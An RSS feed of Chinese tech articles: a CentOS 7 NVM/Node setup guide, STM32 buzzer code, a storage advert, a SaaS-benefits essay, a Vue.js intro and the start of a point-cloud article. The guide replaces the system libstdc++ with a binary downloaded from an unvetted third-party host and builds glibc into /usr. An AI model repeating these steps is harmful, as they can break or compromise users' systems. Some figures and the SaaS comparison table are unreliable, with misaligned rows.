<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>PPMY 新闻订阅</title><link>https://www.ppmy.cn/news/</link><description>自动抓取 https://www.ppmy.cn/news/ 的最新文章</description><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>zh-cn</language><lastBuildDate>Fri, 31 Oct 2025 07:28:29 +0000</lastBuildDate><item><title>在Linux操作系统上安装NVM教程——CentOS 7/VMware 17版</title><link>https://www.ppmy.cn/news/1540009.html</link><description>目录
一、测试网络是否能上网
二、下载阿里云镜像
三、解决执行yum命令出现报错（没有就跳过）
四、下载NVM安装包
五、解压NVM安装包
六、安装Node
七、连接新的动态库
八、升级GLIBC版本
九、安装GCC
十、查看当前服务器CentOS版本
一、测试网络是否能上网
1.网络是否能正常访问：
2.查看文件：
cat /etc/sysconfig/network-scripts/ifcfg-ens33
文件的ONBOOT是否等于"yes"，并不是的话，将其改为yes
编辑文件：
vim /etc/sysconfig/network-scripts/ifcfg-ens33
按I键，修改完成后，按Esc键，输入：
:wq!
二、下载阿里云镜像
1.备份原镜像文件：
1）新建文件夹：
mkdir backup
2）将/etc/yum.repos.d的文件全部移进backup文件夹：
mv /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup
3)复制一份CentOS-Base.repo：
cp /etc/yum.repos.d/backup/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo
2.修改成阿里云镜像：（不要用http://mirrors.
cloud
.aliyuncs.com，用http://mirrors.aliyuncs.com，因为ping http://mirrors.
cloud
.aliyuncs.com，ping不通，访问不到）
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo
3.查看镜像文件内容：cat /etc/yum.repos.d/CentOS-Base.repo
完整的CentOS-Base.repo 文件内容：
# CentOS-Base.repo
#
# The mirror system uses the connecting IP address of the client and the
# update status of each mirror to pick mirrors that are updated to and
# geographically close to the client.  You should use this for CentOS updates
# unless you are manually picking other mirrors.
#
# If the mirrorlist= does not work for you, as a fall back you can try the 
# remarked out baseurl= line instead.
#
#[base]
name=CentOS-$releasever - Base - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/BaseOS/$basearch/os/http://mirrors.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/http://mirrors.cloud.aliyuncs.com/centos/$releasever/BaseOS/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official#additional packages that may be useful
[extras]
name=CentOS-$releasever - Extras - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os/http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/os/http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official#additional packages that extend functionality of existing packages
[centosplus]
name=CentOS-$releasever - Plus - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/os/http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[PowerTools]
name=CentOS-$releasever - PowerTools - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os/http://mirrors.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/http://mirrors.cloud.aliyuncs.com/centos/$releasever/PowerTools/$basearch/os/
gpgcheck=1
enabled=0
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official[AppStream]
name=CentOS-$releasever - AppStream - mirrors.aliyun.com
#failovermethod=priority
baseurl=http://mirrors.aliyun.com/centos/$releasever/AppStream/$basearch/os/http://mirrors.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/http://mirrors.cloud.aliyuncs.com/centos/$releasever/AppStream/$basearch/os/
gpgcheck=1
gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official
4.依次执行命令：
yum clean all
和
yum makecache
如果还是出现报错："Failed connect to mirrors.cloud.aliyuncs.com:80; Connection refused"
三、解决执行yum命令出现报错（没有就跳过）
Could not retrieve mirrorlist http://mirrorlist.centos.org/？release=7&amp;arch=x86_64&amp;repo=os&amp;infra=stock error was
14: curl#6 - "Could not resolve host: mirrorlist.centos.org; 未知的错误"
解决方法：配置dns服务器
1）查看当前网络连接：
nmcli connection show
2）修改当前网络连接对应的dns服务器，网络连接可以使用NAME（ens33）或者UUID（6f403f04-ea93-4abe-9ce3-5236172de5d9），执行命令：
nmcli con mod ens33 ipv4.dns "114.114.114.114 8.8.8.8"
3）启用dns配置：
nmcli con up ens33
现在再执行yum命令就不会报错了，试试吧
四、下载NVM安装包
1.下载nvm包：https://github.com/nvm-sh/nvm/archive/refs/tags/v0.39.5.tar.gz
打开虚拟机浏览器，输入下载链接，出现弹窗，选择保存文件，等待下载，在右上角，下载图标，点击文件夹图标，查看nvm安装包的文件所在文件夹
文件下载默认存放在下载文件夹中
五、解压NVM安装包
1.在/root目录创建.nvm文件夹：
mkdir
/root/.nvm
2.将nvm解压到.nvm文件夹中：
tar -zxvf 下载/nvm-0.39.5.tar.gz -C /root/.nvm/
(-C 解压到指定目录)
或
(两则对比在于前者多了nvm-0.39.5文件夹，后者直接去掉nvm-0.39.5文件夹，直接存放nvm-0.39.5里面的内容)
tar -zxvf 下载/nvm-0.39.5.tar.g --strip-components 1 -C /root/.nvm/
3.编辑
~/.bashrc
文件：
vim ~/.bashrc
，文件末尾添加以下内容（按I键，进入编辑模式，按Esc键，退出编辑模式，保存并强制退出，输入：
:wq!
）
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] &amp;&amp; \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
4.重新编译
.bashrc
文件：
source ~/.bashrc
，检查nvm是否安装成功，输入：
nvm -v
六、安装Node
安装node：
nvm install node版本
（此处安装20.15.0版本）
查看nvm支持安装什么版本的node：
nvm ls-remote
查看已安装的node版本列表：
nvm ls
一开始不知道是网络不好还是怎么样，中断了一下，多执行几次
到这，node就安装成功了，不出意外，输入node -v可以看到node的版本号的，那么，不出意外，意外就要来了
七、连接新的动态库
1.解决问题：
node: /lib64/libstdc++.so.6: version `GLIBCXX_3.4.20' not found (required by node)
node: /lib64/libstdc++.so.6: version `CXXABI_1.3.9' not found (required by node)
node: /lib64/libstdc++.so.6: version `GLIBCXX_3.4.21' not found (required by node)
2.复制链接，执行：wget https://cdn.frostbelt.cn/software/libstdc%2B%2B.so.6.0.26
按住ctrl键，到linux的浏览器下载该文件
3.将下载好的文件，复制一份到/usr/lib64，执行命令：cp 下载/libstdc++.so.6.0.26 /usr/lib64/
4.进入/usr/lib64文件夹，执行命令：ln -snf ./libstdc++.so.6.0.26 libstdc++.so.6
八、升级GLIBC版本
1.解决问题：node: /lib64/libm.so.6: version `GLIBC_2.27' not found (required by node)
2.分析原因：没有找到GLIBC_2.27这个版本，node v18开始，都需要
GLIBC_2.27
支持，而本机的GLIBC版本是比较低的，最高才2.17，不符合要求
（centos7服务器使用nvm安装的node之后，只要使用npm或者node，均会出现以下问题）
3.查看GLIBC版本：
strings /lib64/libc.so.6 | grep GLIBC
4.安装包glibc-2.2
wget https://ftp.gnu.org/gnu/glibc/glibc-2.28.tar.xz
5.进入glibc-2.28文件夹，创建并进入build文件夹，依次执行：mkdir build  和 cd build
6.编译GLIBC：
../configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin
问题：
configure: error: in `/tmp/glibc-2.28/build':
configure: error: no acceptable C compiler found in $PATH
原因：没有找到C编译器的环境路径，简而言之，就是要安装gcc
查看本机gcc版本
（没有这东西）
九、安装GCC
1.执行：yum -y install gcc
资源找不到
执行命令：curl http://mirrors.aliyun.com/centos/7.9.2009/os/x86_64/repodata/repomd.xml -v
再次执行gcc安装命令：yum -y install gcc
查看gcc版本：gcc -v
十、查看当前服务器CentOS版本
1.查看本机服务器版本：rpm -qi centos-release</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540009.html</guid><pubDate>Fri, 31 Oct 2025 07:20:32 +0000</pubDate></item><item><title>基于单片机的一种蜂鸣器的简易控制</title><link>https://www.ppmy.cn/news/1540010.html</link><description>有源和无源这里的“源”不是指电源，而是指震荡源。也就是说，有源蜂鸣器内部带震荡源，所以只要一通电就会叫。而无源内部不带震荡源，所以如果用直流信号无法令其鸣叫。必须用2K~5K的方波去驱动它。有源蜂鸣器往往比无源的贵，就是因为里面多个震荡电路。这就是通过驱动原理来分别的方法。
buzzer.h
#ifndef __BUZZER_H__
#define __BUZZER_H__#include "stm32l0xx_hal.h"//有源蜂鸣器引脚
#define BUZZER_PORT				GPIOA	
#define BUZZER_PIN				GPIO_PIN_12typedef enum 
{BUZZER_OFF = 0,  // 停止BUZZER_ON,      // 开始 }BUZZER_STATUE_E;typedef struct{BUZZER_STATUE_E Buzzer_SW; 		//蜂鸣器开关uint8_t Buzzer_Times; 	      //蜂鸣器响的次数uint32_t Buzzer_DUR;	        //蜂鸣器响的时长uint32_t Buzzer_OFF_DUR;	    //蜂鸣器不响的时长	uint32_t Buzzer_TEMP;	 
}Buzzer_time_T;extern Buzzer_time_T Buzzer_time;void buzzer_ring(Buzzer_time_T *Buzzer_time_para); void set_buzzer(uint8_t sw,uint8_t times,uint32_t on_time,uint32_t off_time);#endif
buzzer.c
#include "buzzer.h"Buzzer_time_T Buzzer_time;//开蜂鸣器
static void open_buzzer(void)
{HAL_GPIO_WritePin(BUZZER_PORT, BUZZER_PIN, GPIO_PIN_SET);
}//关蜂鸣器
static void close_buzzer(void)
{HAL_GPIO_WritePin(BUZZER_PORT, BUZZER_PIN, GPIO_PIN_RESET);
}/*********************************************************
根据结构体Buzzer_time的Buzzer_SW、Buzzer_DUR、Buzzer_Times
三个参数确定蜂鸣器开关、每次时长和次数
*********************************************************/
void buzzer_ring(Buzzer_time_T *Buzzer_time_para)
{static uint8_t flag, times_flag;if(Buzzer_time_para-&gt;Buzzer_SW){if((Buzzer_time_para-&gt;Buzzer_Times) &amp;&amp; (times_flag == 0)){			if(!flag){flag = 1;open_buzzer();Buzzer_time_para-&gt;Buzzer_TEMP = HAL_GetTick();}if(HAL_GetTick()-Buzzer_time_para-&gt;Buzzer_TEMP &gt; Buzzer_time_para-&gt;Buzzer_DUR){flag = 0;Buzzer_time_para-&gt;Buzzer_Times--;close_buzzer();	if(Buzzer_time_para-&gt;Buzzer_Times == 0){Buzzer_time_para-&gt;Buzzer_SW = BUZZER_OFF;				Buzzer_time_para-&gt;Buzzer_DUR = 0;		times_flag = 0;}else{times_flag = 1;				}}}else if((Buzzer_time_para-&gt;Buzzer_Times) &amp;&amp; (times_flag == 1)){if(HAL_GetTick()-Buzzer_time_para-&gt;Buzzer_TEMP &gt; (Buzzer_time_para-&gt;Buzzer_DUR + Buzzer_time_para-&gt;Buzzer_OFF_DUR))	{times_flag = 0;}}}else{close_buzzer();}
}/*********************************************************
设置蜂鸣器响的次数及相应时长
*********************************************************/
void set_buzzer(BUZZER_STATUE_E sw,uint8_t times,uint32_t on_time,uint32_t off_time)
{Buzzer_time.Buzzer_SW      = sw;Buzzer_time.Buzzer_Times   = times;  Buzzer_time.Buzzer_DUR     = on_time;Buzzer_time.Buzzer_OFF_DUR = off_time;
}//for simple test
void test_buzzer(void)
{set_buzzer(BUZZER_ON,3,1000,1000);	while(1){buzzer_ring(&amp;Buzzer_time);}
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540010.html</guid><pubDate>Fri, 31 Oct 2025 07:20:33 +0000</pubDate></item><item><title>影视制作中心15个工作站同时用Adobe Premiere处理25个4K视频流</title><link>https://www.ppmy.cn/news/1540011.html</link><description>对于4K非编人员来说，高分辨率视频编辑卡顿令人抓狂。但素材越来越多，项目越来越大，如何避免卡顿问题？
要知道影视制作过程中对后端存储的性能与容量有较高要求。我们测试在4K非编环境里，10-15台工作站同时运行Adobe Premiere，跑25个4K ProRes 422 视频流。要求存储至少提供5GB/s的读，2GB/s的写，并且提供650TB的空间。才能保证文件快速访问以及流畅非编体验。
1.高性能：普安
GS 4000 G3文件级性能可达13GB/s的读、5.5GB/s的写
，
内置NVMe SSD缓存
显著提高存储性能，特别是在同时处理多个项目或时间轴的情况下。有效减少加载时间，提高大文件的播放效率，实时回放流畅。另外，
GS G3每秒可读近8万个小文件，写6万个小文件，
轻松承担渲染的负载要求。
2.大容量：普安
GS 4040 G3单台空间800PB
，即可满足制作中心所需空间需求，不需要接扩展柜，节省能耗与空间，适合10到15台工作站规模的中小型影视非编用户</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540011.html</guid><pubDate>Fri, 31 Oct 2025 07:20:36 +0000</pubDate></item><item><title>SaaS 为小型企业带来的十大优势</title><link>https://www.ppmy.cn/news/1540012.html</link><description>软件即服务（SaaS）已被各种规模的企业所采用。最近，我们可以清楚地看到 SaaS 为小企业带来的显著好处。如果没有 SaaS，中小企业将无法在竞争中生存。
但在云计算中，SaaS 究竟是什么呢？为什么小企业应该关注它呢？SaaS可以提供前沿技术。它在优化成本的同时提供全面的技术支持，并具有无与伦比的灵活性。
什么是SaaS（软件即服务）？
SaaS 代表软件即服务。基本上，这就像是租用软件而不是直接购买它。SaaS 应用程序不是安装在你的电脑上，而是存在于云端。这意味着你可以通过互联网访问它们。
现在，这里有很便利的一点：当你订阅一个 SaaS 应用程序时，你就无需操心技术方面的事情了。
开发和托管应用程序的繁重工作？有人为你完成了。这就像拥有一个私人信息技术团队。
想想看：对于传统软件，你可能不得不花费大量资金购买服务器硬件，并聘请技术人员来确保一切顺利运行。但是有了 SaaS，所有这些麻烦都由云服务供应商处理。而且由于你只是租用软件，你有更灵活的支付选择。另外，你可以在很短的时间内启动并运行一个新的应用程序。
所以就是这样：SaaS 就像有你自己的私人信息技术管家。它方便、具有成本效益，并且非常适合不同规模的企业。
SaaS 是如何工作的？
想象一下，你过去习惯购买光盘来更新电脑上的软件。这很麻烦，对吧？而有了 SaaS，软件能自动更新。
事情是这样的：SaaS 搭乘云计算的顺风车。把云想象成一个巨大的虚拟空间，所有神奇的事情都可以在那里操作 —— 数据存储、网络、服务器等等。
所以，不像过去那样购买光盘并将更新包下载到你的电脑上，SaaS 让你通过互联网或你的网络浏览器登录。你连接到服务供应商的网络，然后，你就可以访问到你需要的软件了。
现在，谁在搭乘 SaaS 这趟列车呢？嗯，不再仅仅是科技公司了。从金融服务到娱乐再到公用事业，每个行业都在加入。
那为什么小企业应该关心呢？因为 SaaS 让生活更轻松。不再在繁琐的软件更新上浪费时间和金钱。有了 SaaS，你可以专注于经营你的业务，而软件在云端会由服务供应商自动更新。
SaaS 模式与传统模式有何不同？
SaaS（软件即服务）代表了一种现代的软件交付方式，其中应用程序托管在云端并通过互联网访问。这种模式与传统的软件设置有很大不同，传统设置通常涉及在单个设备或服务器上安装软件。
以下是 SaaS 和传统软件在各个方面的区别：
安装
SaaS：有限的定制选项，有预构建的集成可用。
传统软件：需要在电脑或手机上安装软件后才能使用。
部署和访问
SaaS：托管在云端，通过互联网访问，无需在单个设备上安装。
传统软件：通常安装在每个用户的设备或中央服务器上，安装过程很耗时。
成本结构
SaaS：按订阅方式运营，根据使用情况收取费用。
传统软件：涉及大量的前期软件许可证投资，可能后续成本较低。
维护和更新
SaaS：服务供应商负责维护、更新和安全补丁。
传统软件：用户负责维护和更新软件。
定制和集成
SaaS：数据存储在供应商的服务器上，供应商负责安全和合规性。
传统软件：提供更高程度的定制，集成需要额外的编程或开发。
数据安全和合规性
SaaS：数据存储在供应商的服务器上，供应商负责安全和合规性。
传统软件：用户直接控制数据安全和合规措施。
安全性
SaaS：更加安全，无需担心备份数据。
传统软件：依赖杀毒软件进行保护，并且应定期备份重要数据。
用户
SaaS：许多人可以同时使用 SaaS 软件。
传统软件：一次只能有一个人使用传统软件。
SaaS 软件的主要类型
有各种各样的 SaaS 应用程序可满足不同的业务需求。这些 SaaS 解决方案提供灵活性、协作性和便利性，使其成为各种规模企业的热门选择。
客户关系管理（CRM）
CRM 应用程序就像是管理客户数据和跟踪交互的一站式系统。对于销售团队来说，它们尤其完美，特别是那些经常外出的团队，因为他们可以从任何地方访问他们所需的一切。
企业资源规划（ERP）
ERP 软件将企业的所有核心功能，如会计、人力资源和制造等，整合到一个地方。它为企业提供了对其数据的鸟瞰图，使战略规划变得轻而易举。
财务软件
许多组织喜欢财务 SaaS 应用程序的灵活性以及在财务事务上进行协作的能力。
人力资本管理（HCM）和人力资源（HR）
以 HR 为重点的 SaaS 应用程序处理诸如考勤卡、绩效评估和其他 HR 任务，使 HR 部门的工作更加轻松。
项目管理
SaaS 项目管理应用程序对团队来说是天赐之物。它们使项目协作、资源分配和跟踪进度变得轻而易举。
协作软件
电子邮件、日历和消息功能现在都存在于 SaaS 应用程序中，使团队合作比以往任何时候都更加顺畅。
SaaS 对小企业的 10 大好处
软件即服务（SaaS）具有众多优势，为各种业务需求提供了具有成本效益的灵活解决方案。让我们来探讨一下 SaaS 对小企业的十个主要好处：
先试后买
SaaS 供应商通常提供免费试用，让企业在做出承诺之前测试他们的软件。这降低了投资可能不符合公司要求的工具的风险。
SaaS 供应商提供的免费试用让小企业在做出购买之前评估软件解决方案的适用性。根据 Gartner 的一项调查，提供免费试用的企业客户转化率提高了 30%。
这种方法降低了在可能不满足公司需求的软件上进行投资的风险，最终带来更好的决策和资源分配。
轻松设置和访问
SaaS 使企业能够从任何有互联网接入的地方访问基本工具和信息。这种可访问性提高了生产力，并使员工能够高效工作，无论是在办公室还是远程办公。
SaaS 平台通常易于设置，并且需要极少的技术专业知识，允许小企业快速使用软件。根据云安全联盟（CSA）的一项研究，采用基于云的解决方案的企业在新产品和服务的上市时间上缩短了 20.66%。
此外，通过互联网连接从任何位置访问软件的灵活性通过提供远程工作机会提高了员工的生产力。
改善现金流
SaaS 订阅模式为供应商提供可预测的、稳定的收入流，同时允许企业更有效地管理费用。这种稳定性增强了投资者信心。
SaaS 订阅模式同样为企业提供可预测的、稳定的收入流，改善了现金流管理。麦肯锡公司的研究表明，采用基于订阅的收入模式的 SaaS 企业比采用传统一次性销售模式的企业利润率高 9%。
此外，以订阅方式作为软件付费的模式消除了大量前期投资的需要，为其他业务需求保留了资金。
增强用户参与度
基于云的 SaaS 平台通过实时通信和远程可访问性促进用户之间的协作和参与。这种参与度推动了小企业团队的生产力和创新。
SaaS 平台促进用户之间的实时协作和通信，提高了参与度。根据《哈佛商业评论》的一项研究，促进协作工作环境的公司员工生产力提高了 15%。
此外，从多个设备访问 SaaS 工具的可及性促进了用户采用，并在小企业团队中培养了创新文化。
数据安全
SaaS 供应商优先考虑数据安全，提供强大的措施来保护存储在其平台上的敏感信息。这种对数据安全的保障对于处理机密数据的小企业至关重要。
SaaS 供应商在数据安全措施上投入大量资金，以保护存储在其平台上的敏感信息。根据思科的一份报告，采用基于云的安全解决方案的组织安全漏洞减少了 21%。
SaaS 平台采用加密、多因素身份验证和定期安全更新等方式来保护数据免受网络威胁，为小企业提供了对数据安全和合规性的安心。
降低成本
SaaS 大大降低了与购买传统本地软件相关的前期成本。因为小型和初创企业可能资金有限，所以他们可能会发现难以承担高额的前期许可证费用。
使用 SaaS，企业可以采用按需付费的结构，随着时间的推移并根据使用情况支付订阅费用。与直接购买软件相比，这种基于订阅的模式降低了财务风险。
此外，SaaS 供应商支持安装、配置和维护等服务。因此，企业可以节省聘请 IT 专业人员的费用。SaaS 产品的共享环境意味着所有客户分担维护和更新的成本，使高质量的软件对每个人来说都更实惠。
无缝集成
SaaS 模式在支付计划方面提供灵活性，允许客户仅在使用服务时为其付费。这种灵活性使企业能够根据自己的需求（无论是扩大还是缩小规模）调整订阅。
客户可以根据需要轻松注册、取消、降级或升级服务，从而控制自己的费用，并确保只支付他们使用的服务。
用户友好
SaaS 产品以其易用性而闻名，因为供应商管理 IT 开发、维护和安全。用户只需连接到互联网并登录即可访问最新的应用程序，无需IT专业知识或技术支持。
这种可访问性节省了时间和精力，允许员工快速采用新软件并专注于富有成效的任务。SaaS 供应商处理技术问题并确保数据安全。这为客户腾出了宝贵的工作时间，使其能够专注于核心业务活动。
可访问性和可扩展性
SaaS 提供无与伦比的灵活性，允许企业在无需提前通知的情况下更改使用计划。由于软件由 SaaS 供应商在外部托管，因此可以从任何有互联网连接的地方访问，非常适合远程工作和多站点操作。
用户可以从任何位置访问他们的数据并有效地工作，提高团队之间的生产力和协作。
持续更新
SaaS 供应商负责持续更新软件。这就是它始终保持领先地位和竞争力的方式。随着时间的推移，它会进行以下操作：（1）定期推出更新版本（2）修复漏洞（3）添加新功能（4）适应不断变化的用户需求
这种持续改进对供应商和客户都有益，允许供应商随着时间的推移改进他们的产品并提高客户满意度。客户只需简单点击即可轻松升级到最新版本，一旦有新功能和改进可用，即可立即访问。
成功案例：借助 SaaS 获得成功的企业。
软件即服务（SaaS）已成为寻求可扩展、高性价比解决方案的公司的变革者。让我们来探讨企业是如何利用 SaaS 平台来推动增长、简化运营并取得显著成功的。
Salesforce
Salesforce 是一家领先的基于云的 SaaS 公司，提供全面的软件套件，用于客户服务、营销自动化和应用程序开发。营销人员利用 Salesforce 通过跟踪客户信息和促进积极的客户互动来加快交易速度。
为什么 Salesforce 脱颖而出：Salesforce 为各种规模的企业提供量身定制的计划，并拥有涵盖各个行业的庞大服务目录，作为一种多功能解决方案脱颖而出。它不仅在销售、客户服务和运营方面表现出色，在营销和电子商务功能方面也很出色。
Salesforce 成功案例：在全球范围内，近 23% 的企业依赖 Salesforce，并且该公司的员工队伍中有超过 50% 的人来自代表性不足的群体。
Grammarly
Grammarly 为人工智能驱动的拼写检查树立了标准，提供免费版本用于基本的拼写检查，以及高级版本用于高级写作和编辑辅助。它提供准确的单词和短语建议，识别不良的写作结构如被动语态，并提供措辞修正。
为什么 Grammarly 脱颖而出：Grammarly 强大的人工智能确保准确的拼写检查和编辑，帮助用户撰写精美的文档和电子邮件。此外，Grammarly 的包容性方法通过标记性别化语言并提出替代方案来解决偏见问题。
Grammarly 成功案例：Grammarly 最初通过向大学销售实现盈利，在获得大量收入后转向消费者市场。由于其已经庞大的用户基础，这个自筹资金的企业向免费增值模式的转变非常顺利。
Notion
Notion 提供灵活的项目管理解决方案，以其基于模块的系统和可定制的工作区而著称。它具有用户友好的界面，并带有拖放功能。即使对于非技术用户，也可以轻松定制工作区风格。
为什么 Notion 脱颖而出：Notion 拥有广泛的功能，包括人工智能、自动化、分析、任务和截止日期，以及与 Google Drive 等的无缝集成。
Notion 成功案例：尽管在 2015 年遭遇了最初的挫折，但 Notion 在获得更多资金后反弹，积累了超过 400 万全球用户，并实现了 100 亿美元的估值。其以用户为中心的方法和适应性强的功能促成了其显著的成功。
SaaS vs. PaaS vs. IaaS
好的，让我们简单地分析一下 SaaS、PaaS 和 IaaS 之间的区别。
首先是 SaaS，即软件即服务。这就像你的 Netflix 订阅服务，但针对的是软件。你通过互联网访问它，由第三方供应商管理所有繁琐的事情。比如 Dropbox、Google Workspace 或 Salesforce。
接下来是 PaaS，即平台即服务。这就像是开发者的游乐场。它在网络上为开发者提供一个平台，让他们可以创建软件而无需担心存储或基础设施。他们可以专注于构建酷炫的东西，而无需为小细节操心。
最后但同样重要的是 IaaS，即基础设施即服务。这就像租用你的 IT 设置的零部件。你可以按需访问服务器、存储空间、内存等更多资源。所以，如果你需要更多的存储空间或计算能力，你可以根据需要进行调整。比如 Amazon Web Services、Microsoft Azure 或 Rackspace。
以下是 SaaS、PaaS 和 IaaS 之间的关键区别：
交付模式
SaaS（软件即服务）：通过订阅模式在互联网上访问软件应用程序。
PaaS（平台即服务）：在网络上提供开发平台，允许开发者专注于构建软件。
IaaS（基础设施即服务）：按需访问基本的 IT 基础设施组件，如服务器、存储和网络资源。
管理模式
SaaS（软件即服务）：完全由服务供应商管理。用户只需通过互联网访问软件。
PaaS（平台即服务）：开发者管理应用程序代码，而服务供应商处理底层基础设施。
IaaS（基础设施即服务）：用户控制操作系统、应用程序和开发框架，在提供的基础设施之上进行管理。
客户群体
SaaS（软件即服务）：非常适合需要访问软件应用程序而无需担心维护或基础设施的最终用户。
PaaS（平台即服务）：最适合需要平台来创建、测试和部署应用程序而无需管理底层基础设施的软件开发者。
IaaS（基础设施即服务）：专为需要可扩展计算资源而无需前期购买和维护硬件成本的企业设计。
案例
SaaS（软件即服务）：Dropbox、Google Workspace、Salesforce。
PaaS（平台即服务）：Heroku、Microsoft Azure App Service、Google App Engine。
IaaS（基础设施即服务）：Amazon Web Services（AWS）、Microsoft Azure、Google Cloud Platform（GCP）。
好处
SaaS（软件即服务）：易于访问、维护量最小且前期成本较低。
PaaS（平台即服务）：简化开发流程、更快地推向市场以及可扩展性。
IaaS（基础设施即服务）：可扩展性、灵活性以及减少硬件方面的资本支出。
挑战
SaaS（软件即服务）：自定义选项有限，依赖服务供应商的基础设施和更新。
PaaS（平台即服务）：依赖特定的平台工具和潜在的供应商。
IaaS（基础设施即服务）：管理复杂、潜在的安全问题以及需要具备管理基础设施组件的专业知识。
总结
SaaS 对小企业的好处是显而易见且极具吸引力的。易于升级、成本更低和增强的可扩展性等特性使 SaaS 成为现代计算的基石。
通过采用 SaaS 解决方案，企业可以摆脱复杂的部署过程和昂贵的硬件投资的负担，转而专注于增长和创新。随着计算的未来不断朝着基于云的解决方案发展，SaaS 作为中小企业的变革者脱颖而出。
本文转载自 雪兽软件
更多精彩推荐请访问 雪兽软件官网</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540012.html</guid><pubDate>Fri, 31 Oct 2025 07:20:39 +0000</pubDate></item><item><title>前端开发学习（一）VUE框架概述</title><link>https://www.ppmy.cn/news/1540013.html</link><description>一、MVC模式与MVVM模式
1.1mvc模式
MVC模式是移动端应用广泛的软件架构之一，MVC模式将应用程序划分为3部分:Model(数据模型)、View(用户界面视图)和Controller(控制器)。MVC模式的执行过程是将View层展示给用户，也就是通过 HTML页面接受用户动作，将指令传递给Controler，如单击一个按钮，就会将按钮触发的业务传递给 Controller:Controller完成业务逻辑，要求Model改变状态。
图1：mvc执行过程图
1.2MVVM格式
MVVM 模式是将MVC模式的Controller改成 ViewModel。View的变化自动更新 ViewModel,ViewModel的变化也会自动同步到 View层显示。View层用来接受用户请求，如 DOM 事件、AJAX等:Model层处理数据，不再与 View层交互数据;ViewModel 监听 View 层请求状态的变化，同时刷新 View层显示，ViewModel和 Model层之间进行数据双向绑定，Model层监听ViewModel的变化。MVVM 模式的执行过程是 View层接受到请求告诉 VewModel，用户需要执行一些处理动作，当 ViewModel 发生变化，告诉 View层需要更新页面。所谓的数据双向绑定是 ViewModel 需要更新 Model 层的数据;反之,Model层的数据改变，在ViewModel中的数据状态也要进行相应的改变。
图2：mvvm执行过程图
1.3mvc模式和mvv模式的区别
在 MVC 模式中，数据是单向通信的，按照 View→Controller→Model-View方向循环。在MVVC模式中，数据可以双向通信，核心是ViewModel对象。
二、Vue框架的特性
Vue 是一套构建用户界面的渐进式框架，Vue只关注视图层，采用自底而上增量开发的设计，Vue的目标是通过 API实现数据绑定和组合视图组件。Vue是主流的MVVM 框架之一。
三、vue框架的安装与使用
3.1方法一
1.复制vue.js的全部内容
进入这个网址，CTRL+A全选并复制所有内容
2.新建一个名称为vue2.js文件,将复制内容粘贴进去
3.测试+正确结果
&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;vue的安装、创建vue.js&lt;/title&gt;&lt;script src="./vue2.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="app"&gt;name={
{name}}&lt;/div&gt;&lt;script&gt;var vm=new Vue({el:"#app",data:{name:"郑州"}})&lt;/script&gt;&lt;/body&gt;
&lt;/html&gt;
3.2方法二：利用CDN方式引入vue.js文件
直接使用网址，不用下载
&lt;!DOCTYPE html&gt;
&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;CDN方式引用&lt;/title&gt;&lt;script src="https://cdn.jsdelivr.net/npm/vue@2"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="app"&gt;name={
{name}}&lt;/div&gt;&lt;script&gt;var vm=new Vue({el:"#app",data:{name:"河南"}})&lt;/script&gt;&lt;/body&gt;
&lt;/html&gt;
运行结果
3.3方法三：采用npm和webpack模块形式引入vue.js文件（暂时先不讲）</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540013.html</guid><pubDate>Fri, 31 Oct 2025 07:20:41 +0000</pubDate></item><item><title>PCL 点云配准-4PCS算法（粗配准）</title><link>https://www.ppmy.cn/news/1540014.html</link><description>目录
一、概述
1.1原理
1.2实现步骤
1.3应用场景
二、代码实现
2.1关键函数
2.1.1 加载点云数据
2.1.2 执行4PCS粗配准
2.1.3 可视化源点云、目标点云和配准结果
2.2完整代码
三、实现效果
3.1原始点云
3.2配准后点云
PCL点云算法汇总及实战案例汇总的目录地址链接：
PCL点云算法与项目实战案例汇总（长期更新）
一、概述
4PCS（四点一致集）算法是一种用于点云配准的粗配准方法。
该算法通过寻找目标点云和源点云之间具有几何约束的四点集合进行匹配，继而估计出变换矩阵。
